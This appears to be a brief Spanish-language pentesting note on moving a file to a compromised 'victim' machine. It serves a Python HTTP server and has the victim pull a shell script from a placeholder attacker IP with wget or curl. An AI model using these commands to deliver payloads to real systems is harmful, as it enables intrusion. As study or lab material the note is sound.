Se levanta un **servidor HTTP**:
	`python3 -m http.server 8000`
Luego, desde la máquina víctima (remota), descargas el archivo con:
	`wget http://TU_IP:8000/archivo.sh`
o si no tiene `wget`:
	`curl http://TU_IP:8000/archivo.sh -o archivo.sh`


